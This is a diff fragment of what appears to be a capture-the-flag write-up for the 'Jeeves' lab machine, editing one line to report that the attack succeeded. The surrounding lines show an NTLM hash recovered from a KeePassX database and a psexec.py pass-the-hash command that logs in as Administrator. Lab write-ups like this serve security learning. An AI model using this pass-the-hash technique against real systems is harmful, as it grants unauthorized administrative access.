@@ -58,7 +58,7 @@ Opened the file: </br>
 ![keepassx_file_opened](images/jeeves/keepassx_file_opened.png) </br>
 The only password that stood out was the first one (Backup stuff), it contained a hash that looked like a NTLM hash: </br>
 ```aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00``` </br>
-I tried using 'pass the hash' and log in as an administrator with psexec: </br>
+I tried using 'pass the hash' and log in as an administrator with psexec, and it worked: </br>
 ```psexec.py Administrator@10.10.10.63 -hashes``` </br>
 ```aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00``` </br> </br>
 **Proof Of Screenshot:** </br>
